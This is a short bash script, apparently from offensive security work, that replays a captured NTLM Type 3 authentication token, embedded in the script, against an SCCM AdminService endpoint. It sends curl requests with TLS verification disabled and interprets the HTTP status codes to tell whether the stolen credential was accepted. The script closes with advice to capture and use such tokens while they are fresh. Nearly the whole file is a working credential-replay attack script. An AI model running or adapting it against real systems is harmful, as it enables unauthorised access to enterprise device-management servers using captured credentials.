#!/bin/bash

# Test if captured Type 3 AUTHENTICATE token works against HTTPS endpoint
# WARNING: Type 3 tokens are challenge-response based and expire quickly!

TYPE3_TOKEN="TlRMTVNTUAADAAAAAQABAHAAAAAAAAAAcQAAAAAAAABYAAAAAAAAAFgAAAAYABgAWAAAAAAAAABxAAAABYqIogoAfE8AAAAPwN8qQsx3ypjDezlisG/sUVMAQwBDAE0ALQBTAEkAVABFAFMAUgBWAAA="
TARGET="https://sccm-sitesrv1.domain.local"

echo "=== Testing Type 3 AUTHENTICATE Token ==="
echo ""
echo "IMPORTANT: Type 3 tokens are challenge-response based!"
echo "This token was generated in response to a specific Type 2 challenge"
echo "It may no longer be valid (expired or wrong challenge)"
echo ""

# Test 1: Try a simple GET to AdminService
echo "Test 1: GET /AdminService/wmi/SMS_Admin (should return 200 or 401)"
curl -v -k -X GET \
  -H "Authorization: Negotiate ${TYPE3_TOKEN}" \
  "${TARGET}/AdminService/wmi/SMS_Admin" \
  2>&1 | grep -E "< HTTP|< WWW-Authenticate|< Content-Length"

echo ""
echo "---"
echo ""

# Test 2: Try to GET a simple resource
echo "Test 2: GET /AdminService/v1.0/Device (simpler endpoint)"
curl -v -k -X GET \
  -H "Authorization: Negotiate ${TYPE3_TOKEN}" \
  "${TARGET}/AdminService/v1.0/Device" \
  2>&1 | grep -E "< HTTP|< WWW-Authenticate|< Content-Length"

echo ""
echo "---"
echo ""

# Test 3: Show what a fresh NTLM handshake looks like (for comparison)
echo "Test 3: Fresh NTLM handshake (for comparison - will fail without Type 1)"
curl -v -k -X GET \
  "${TARGET}/AdminService/wmi/SMS_Admin" \
  2>&1 | grep -E "< HTTP|< WWW-Authenticate"

echo ""
echo "=== Analysis ==="
echo ""
echo "If you see 401 with WWW-Authenticate: Negotiate, the token was rejected"
echo "If you see 200 OK, authentication succeeded!"
echo "If you see 500, authentication succeeded but the request was malformed"
echo ""
echo "RECOMMENDATION: Capture Type 3 and immediately test while token is fresh"
